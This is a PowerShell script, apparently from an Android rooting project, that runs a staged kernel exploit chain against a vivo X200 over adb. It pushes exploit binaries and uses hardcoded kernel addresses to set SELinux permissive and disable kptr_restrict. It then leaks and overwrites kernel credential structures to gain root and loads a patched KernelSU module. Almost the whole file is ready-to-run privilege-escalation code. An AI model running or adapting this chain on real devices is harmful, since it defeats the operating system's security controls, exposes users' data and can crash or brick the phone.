# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 GhostLock-X200 contributors
param(
  [string]$AdbPath,   # override adb.exe location
  [string]$Serial,    # override device serial
  [string]$WorkDir,   # override package root
  [string]$KsuKoPath  # user-supplied kernelsu.ko (default: $env:KSU_KO_PATH)
)
$ErrorActionPreference = 'SilentlyContinue'
# ============================================================
# root_full_official.ps1 - LEGACY reference chain (vivo X200 PD2415/b57):
# STAGE1 permissive (W2) -> STAGE2 kptr (leaf-RED, deterministic)
#   -> STAGE3 base check -> STAGE3.5 kallsyms + repatch [optional kernelsu] + push
#   -> STAGE4 w2host cred leak -> STAGE5 CAPSROOT -> STAGE6 INSMOD [kernelsu]
# Kept as a research control: it does NOT load permissive_restore (no permissive restore)
# and does NOT use dynamic offsets (see COMPATIBILITY note below).
# Design: idempotent, strict gates, no blind retry loops.
# ============================================================
# COMPATIBILITY: GL_TARGET / GL_W0 below are hardcoded b57
# (6.6.89-android15-8-gb57af212129c) boot-specific addresses captured from
# the original validation session. This legacy script does not derive them
# dynamically (use tools/scripts/root_full_permissive_restore.ps1 for that). Values are for
# reference only; do not reuse them on other builds/kernels.
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$pkgRoot   = Split-Path -Parent (Split-Path -Parent $scriptDir)   # package root (ghostlock-x200-root)
if ($WorkDir) { $pkgRoot = $WorkDir }

# ---- env detection: adb / python (override via -AdbPath / $env:ANDROID_ADB) ----
$adb = $AdbPath
if (-not $adb) { $adb = $env:ANDROID_ADB }
if (-not $adb) { $adb = (Get-Command adb -ErrorAction SilentlyContinue).Source }
if (-not $adb) {
  $cand = @("C:\Program Files\platform-tools\adb.exe", "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe")
  $adb = $cand | Where-Object { Test-Path $_ } | Select-Object -First 1
}
if (-not $adb) { Write-Output "ADB NOT FOUND: pass -AdbPath, set ANDROID_ADB, or install platform-tools"; exit 1 }
$python = $env:PYTHON
if (-not $python) { $python = (Get-Command python -ErrorAction SilentlyContinue).Source }
if (-not $python) { $python = (Get-Command py -ErrorAction SilentlyContinue).Source }
if (-not $python) { $python = (Get-Command python3 -ErrorAction SilentlyContinue).Source }
if (-not $python) { Write-Output "PYTHON NOT FOUND"; exit 1 }
# device serial: -Serial / $env:ANDROID_SERIAL, else auto-detect single device
$serial = $Serial
if (-not $serial) { $serial = $env:ANDROID_SERIAL }
if (-not $serial) {
  $devs = @(& $adb devices 2>$null | Select-String "	device$" | ForEach-Object { ($_ -split "	")[0] })
  if ($devs.Count -eq 1) { $serial = $devs[0]; Write-Output "auto serial: $serial" }
  elseif ($devs.Count -gt 1) { Write-Output "MULTIPLE DEVICES: set $env:ANDROID_SERIAL"; exit 1 }
  else { Write-Output "NO DEVICE ONLINE"; exit 1 }
}

function Resolve-Asset($pkgRel) {
  $p = Join-Path $pkgRoot $pkgRel
  if (Test-Path $p) { return $p }
  Write-Output "ASSET MISSING: $pkgRel - download the matching GitHub Release assets into the package"
  exit 1
}
# Optional user-supplied KernelSU module (GPL-2.0-only, built for this kernel).
# Empty = KSU stage skipped. This is the legacy reference chain (no permissive_restore).
$KO_OFFICIAL  = $KsuKoPath
if (-not $KO_OFFICIAL) { $KO_OFFICIAL = $env:KSU_KO_PATH }
$KSUD         = Resolve-Asset "prebuilt\ksud"
$GLT          = Resolve-Asset "prebuilt\glt_esync"
$W2HOST       = Resolve-Asset "prebuilt\w2host"
$PATCH_ALL    = Resolve-Asset "tools\offset_tools\patch_ko_all.py"
$ROOTCMD_CLI  = Resolve-Asset "tools\offset_tools\rootcmd_client.py"
$KSYM_OUT     = Join-Path $env:TEMP ("kallsyms_{0}.txt" -f (Get-Date -Format HHmmss))

function Adb($a) { try { $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName=$adb; $psi.Arguments="-s $serial $a"; $psi.UseShellExecute=$false; $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $p=[System.Diagnostics.Process]::Start($psi); $out=$p.StandardOutput.ReadToEnd(); $err=$p.StandardError.ReadToEnd(); $p.WaitForExit(); return ([string]($out+$err)).Trim() } catch { return "" } }
function Shell($cmd) { return [string](Adb "shell $cmd") }
function Alive { return ((Adb "shell echo ok").Trim() -eq 'ok') }
function Rootcmd($cmd) { Adb "forward tcp:19000 localfilesystem:/data/local/tmp/rootcmd.sock" | Out-Null; return ([string](& $python $ROOTCMD_CLI "$cmd" 2>&1 | Out-String)).Trim() }

Write-Output "=== root_full_official (LEGACY): permissive -> kptr(leaf-RED) -> CAPSROOT -> [kernelsu] ==="
Write-Output "assets: KO=$KO_OFFICIAL GLT=$GLT W2=$W2HOST"

# ---- 等待设备稳定 ----
for ($i=0; $i -lt 40; $i++) { $u = (Shell "cat /proc/uptime").Split(' ')[0]; if ($u -and [double]$u -gt 240) { Write-Output "uptime=$u OK"; break }; Start-Sleep -Seconds 10 }
if (-not (Alive)) { Write-Output "DEVICE NOT ALIVE"; exit 1 }

# ---- 推送工具二进制 (先确保设备有 glt_esync/w2host) ----
Shell "rm -f /data/local/tmp/glt_esync"
Adb "push $GLT /data/local/tmp/glt_esync" | Out-Null
Shell "chmod 755 /data/local/tmp/glt_esync"
Shell "rm -f /data/local/tmp/ksud"
Adb "push $KSUD /data/local/tmp/ksud" | Out-Null
Shell "chmod 755 /data/local/tmp/ksud"

# ---- STAGE1: permissive (W2 形态, 确定性) ----
$perm_ok = $false
for ($r=1; $r -le 5; $r++) {
  if (-not (Alive)) { Write-Output "STAGE1 ROUND $r DEVICE DOWN (panic?)"; exit 1 }
  $se = Shell "getenforce"
  if ($se -eq 'Permissive') { Write-Output "PERMISSIVE already OK"; $perm_ok=$true; break }
  Shell "rm -f /data/local/tmp/slide_probe"
  Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_TARGET=0xffffff8002346ee8 GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 /data/local/tmp/glt_esync > /data/local/tmp/p.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
  for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 5; if (-not (Alive)) { break }; if ((Shell "getenforce") -eq 'Permissive') { $perm_ok=$true; break } }
  if ($perm_ok) { Write-Output "STAGE1 ROUND ${r}: PERMISSIVE OK"; break }
  if (-not (Alive)) { Write-Output "STAGE1 ROUND ${r}: DEVICE DOWN (panic?)"; exit 1 }
  Write-Output "STAGE1 ROUND ${r}: miss (safe), retry"
  Start-Sleep -Seconds 5
}
if (-not $perm_ok) { Write-Output "STAGE1 FAIL after 5 rounds"; exit 1 }

# ---- STAGE2: kptr (叶子 RED 形态, 确定性; GL_W0=kptr_restrict-8) ----
$kptr_ok = $false
for ($r=1; $r -le 5; $r++) {
  if (-not (Alive)) { Write-Output "STAGE2 ROUND $r DEVICE DOWN"; exit 1 }
  $kp = Shell "cat /proc/sys/kernel/kptr_restrict 2>/dev/null"
  if ($kp.Trim() -eq '0') { Write-Output "KPTR already 0"; $kptr_ok=$true; break }
  Shell "rm -f /data/local/tmp/slide_probe"
  Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TARGET_LEAF=1 GL_W0=0xffffff800210bd18 GL_ENTER_DELAY=5000 GL_ATTEMPTS=1 timeout 25 /data/local/tmp/glt_esync > /data/local/tmp/kptr.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
  for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 5; if (-not (Alive)) { break }; if ((Shell "cat /proc/sys/kernel/kptr_restrict 2>/dev/null").Trim() -eq '0') { $kptr_ok=$true; break } }
  if ($kptr_ok) { Write-Output "STAGE2 ROUND ${r}: KPTR OK (leaf-RED)"; break }
  if (-not (Alive)) { Write-Output "STAGE2 ROUND ${r}: DEVICE DOWN (panic?)"; exit 1 }
  Write-Output "STAGE2 ROUND ${r}: miss, retry"
  Start-Sleep -Seconds 5
}
if (-not $kptr_ok) { Write-Output "STAGE2 FAIL (kptr != 0)"; exit 1 }

# ---- STAGE3: base 严格校验 (12:48 panic 根因修复) ----
$text = Shell "grep -m1 ' _text$' /proc/kallsyms"
if ($text -notmatch '^([0-9a-f]{16}) T _text$') { Write-Output "STAGE3 FAIL: no _text: '$text'"; exit 1 }
$bstr = $matches[1]
if ($bstr -eq '0000000000000000') { Write-Output "STAGE3 FAIL: _text=0 (kptr masked!)"; exit 1 }
if ($bstr -notmatch '^ffffff[cdef][0-9a-f]+$') { Write-Output "STAGE3 FAIL: base high bits bad: $bstr"; exit 1 }
if ($bstr -notmatch '00000$') { Write-Output "STAGE3 FAIL: base not aligned: $bstr"; exit 1 }
$base = [Convert]::ToUInt64("0x$bstr",16)
$capsym = ('0x{0:x}' -f ($base + 0x23739ff))
Write-Output "STAGE3 OK: base=$bstr capsym=$capsym"

# ---- STAGE3.5: dump kallsyms (当前 boot) + repatch 官方 ko + push ----
Adb "shell cat /proc/kallsyms" | Out-File -FilePath $KSYM_OUT -Encoding ascii
$sz = (Get-Item $KSYM_OUT).Length
if ($sz -lt 1000000) { Write-Output "STAGE3.5 FAIL: kallsyms too small ($sz)"; exit 1 }
Write-Output "STAGE3.5: kallsyms dumped ($sz bytes)"
if ($KO_OFFICIAL) {
  $KO_PATCHED = Join-Path $env:TEMP "kernelsu_patched_now.ko"
  & $python $PATCH_ALL $KO_OFFICIAL $KSYM_OUT $KO_PATCHED 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "patch: $_" }
  if (-not (Test-Path $KO_PATCHED)) { Write-Output "STAGE3.5 FAIL: patch no output"; exit 1 }
  Adb "push $KO_PATCHED /data/local/tmp/kernelsu.ko" | Out-Null
  Shell "chmod 644 /data/local/tmp/kernelsu.ko"
  Write-Output "STAGE3.5 OK: ko pushed ($((Get-Item $KO_PATCHED).Length) bytes)"
} else {
  Write-Output "STAGE3.5: kernelsu.ko not provided (set KSU_KO_PATH) - KSU stage skipped"
}

# ---- STAGE4: w2host cred 泄漏 ----
Adb "push $W2HOST /data/local/tmp/w2host" | Out-Null
Shell "chmod 755 /data/local/tmp/w2host"
Shell "pkill -x w2host; rm -f /data/local/tmp/rootcmd.sock /data/local/tmp/w2_cred.txt /data/local/tmp/w2_dbg.log /data/local/tmp/root_proof; nohup /data/local/tmp/w2host > /data/local/tmp/w2h.log 2>&1 &"
$credline = ''
for ($i=0; $i -lt 40; $i++) { Start-Sleep -Seconds 3; if (-not (Alive)) { Write-Output "STAGE4 DEVICE DOWN"; exit 1 }; $credline = Shell "cat /data/local/tmp/w2_cred.txt 2>/dev/null"; if ($credline -and $credline.Length -gt 20 -and $credline -notmatch '^[\x00]+$') { break } }
if (-not $credline -or $credline.Length -le 20) { Write-Output "STAGE4 FAIL: no cred file"; exit 1 }
$cands = @()
$credline -split ' ' | ForEach-Object { if ($_ -match '^ffffff[8cdef][0-9a-f]{9}$' -and $_ -ne '0000000000000000') { if ($cands -notcontains $_) { $cands += $_ } } }
if ($cands.Count -eq 0) { Write-Output "STAGE4 FAIL: candidates bad: $credline"; exit 1 }
Write-Output "STAGE4 OK: candidates=$($cands -join ',')"

# ---- STAGE5: CAPSROOT (写 [cred+0x38]=capsym) ----
$cred = ''
foreach ($c in $cands) {
  if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic?)"; exit 1 }
  $t = ('0x{0:x}' -f ([Convert]::ToUInt64($c,16) + 0x38))
  Shell "rm -f /data/local/tmp/root_proof"
  Shell "echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_TARGET=$t GL_INIT_CRED=$capsym GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 /data/local/tmp/glt_esync > /data/local/tmp/w.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &"
  $rp = ''
  for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 2; if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic)"; exit 1 }; $rp = Shell "cat /data/local/tmp/root_proof 2>/dev/null"; if ($rp -match 'CAPSROOT') { Write-Output "STAGE5 OK: $rp"; $cred=$c; break } }
  if ($cred) { break }
  Write-Output "STAGE5 candidate $c miss, next"
}
if (-not $cred) { Write-Output "STAGE5 FAIL: no CAPSROOT"; exit 1 }
Start-Sleep -Seconds 3
if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN after CAPSROOT"; exit 1 }
Write-Output "STAGE5 OK: CAPSROOT cred=$cred"

# ---- STAGE6: rootcmd + INSMOD 官方 ko + 版本验证 ----
$id = Rootcmd "ID"
Write-Output "rootcmd: $id"
if ($id -notmatch 'uid=2000') { Write-Output "STAGE6 FAIL: rootcmd not online"; exit 1 }
$already = Shell "cat /proc/modules | grep -c '^kernelsu'"
if ([int]$already -gt 0) { Write-Output "STAGE6: kernelsu already loaded (count=$already), skip INSMOD" }
elseif ($KO_OFFICIAL) {
  Write-Output "STAGE6: INSMOD /data/local/tmp/kernelsu.ko ..."
  $r = Rootcmd "INSMOD /data/local/tmp/kernelsu.ko"
  Write-Output "INSMOD ret: $r"
  Start-Sleep -Seconds 6
  if (-not (Alive)) { Write-Output "STAGE6 DEVICE DOWN after INSMOD"; exit 1 }
  $mod = Shell "cat /proc/modules | grep '^kernelsu'"
  if ($mod -notmatch 'kernelsu') { Write-Output "STAGE6 FAIL: module not in /proc/modules: '$mod'"; exit 1 }
  Write-Output "STAGE6 OK: $mod"
} else {
  Write-Output "STAGE6: kernelsu.ko not provided (set KSU_KO_PATH) - KSU stage skipped"
}
if ($KO_OFFICIAL) {
  $ver = Shell "/data/local/tmp/ksud debug version 2>&1 | head -2"
  Write-Output "ksud version: $ver"
  if ($ver -match '32525') { Write-Output "=== ALL STAGES PASS: KSU 32525 = Manager 32525 ===" }
  else { Write-Output "WARN: version line: $ver" }
} else {
  Write-Output "=== ALL STAGES PASS (no KSU): legacy chain completed ==="
}
Write-Output "uptime: $(Shell 'cat /proc/uptime')  selinux: $(Shell 'getenforce')"
